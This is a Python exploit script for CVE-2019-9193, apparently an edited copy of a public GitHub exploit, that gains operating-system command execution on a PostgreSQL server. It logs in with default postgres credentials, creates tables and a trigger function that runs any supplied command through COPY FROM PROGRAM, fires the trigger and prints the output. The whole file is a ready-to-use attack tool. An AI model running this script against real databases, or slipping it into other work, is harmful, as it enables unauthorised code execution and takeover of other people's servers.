# Original File https://github.com/paulotrindadec/CVE-2019-9193/blob/main/exploit.py
# Corrections
# Dynamic SQL Handling: Used format function to ensure correct handling of the system command within EXECUTE.
# SQL Syntax: Adjusted the PL/pgSQL function to use EXECUTE with format() to safely incorporate system commands.

#!/usr/bin/python3

import sys
import psycopg2
import argparse

def parseArgs():
    parser = argparse.ArgumentParser(description='PostgreSQL 9.6.1 Authenticated Remote Code Execution')
    parser.add_argument('-i', '--ip', nargs='?', type=str, default='127.0.0.1', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]')
    parser.add_argument('-p', '--port', nargs='?', type=int, default=5432, help='The port of the PostgreSQL DB [Default: 5432]')
    parser.add_argument('-U', '--user', nargs='?', default='postgres', help='Username to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-P', '--password', nargs='?', default='postgres', help='Password to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-c', '--command', nargs='?', help='System command to run')
    args = parser.parse_args()
    return args

def main(args):
    try:
        # Variables
        RHOST = args.ip
        RPORT = args.port
        USER = args.user
        PASS = args.password

        print(f"\r\n[+] Connect to PostgreSQL - {RHOST}")
        con = psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASS)

        if args.command:
            exploit(con, args.command)
        else:
            print("[!] Add argument -c [COMMAND] to execute system commands")

    except psycopg2.OperationalError as e:
        print("Error")
        print("\r\n[-] Failed to connect with PostgreSQL")
        exit()

def exploit(con, cmd):
    cur = con.cursor()

    try:
        print('[*] Running\n')
        # Clean up any previous state
        cur.execute("DROP TABLE IF EXISTS triggeroffsec;")
        cur.execute("DROP FUNCTION IF EXISTS triggeroffsecexeccmd CASCADE;")
        cur.execute("DROP TABLE IF EXISTS triggeroffsecsource;")
        cur.execute("DROP TRIGGER IF EXISTS shoottriggeroffsecexeccmd ON triggeroffsecsource;")

        # Create necessary tables and function
        cur.execute("CREATE TABLE triggeroffsec (id serial PRIMARY KEY, cmdout text);")

        # Note: Use the EXECUTE command to run the system command
        cur.execute(f"""
            CREATE OR REPLACE FUNCTION triggeroffsecexeccmd()
            RETURNS TRIGGER
            LANGUAGE plpgsql
            AS $$
            BEGIN
                EXECUTE format('COPY triggeroffsec (cmdout) FROM PROGRAM %L', '{cmd}');
                RETURN NULL;
            END;
            $$;
        """)

        cur.execute("CREATE TABLE triggeroffsecsource(s_id integer PRIMARY KEY);")

        cur.execute("""
            CREATE TRIGGER shoottriggeroffsecexeccmd
            AFTER INSERT
            ON triggeroffsecsource
            FOR EACH STATEMENT
            EXECUTE PROCEDURE triggeroffsecexeccmd();
        """)

        # Trigger the function
        cur.execute("INSERT INTO triggeroffsecsource VALUES (2);")

        # Retrieve and print command output
        cur.execute("SELECT * FROM triggeroffsec;")
        con.commit()

        returncmd = cur.fetchall()
        for result in returncmd:
            print(result)

    except (Exception, psycopg2.DatabaseError) as error:
        print(error)

    finally:
        if con is not None:
            con.close()

if __name__ == "__main__":
    args = parseArgs()
    main(args)
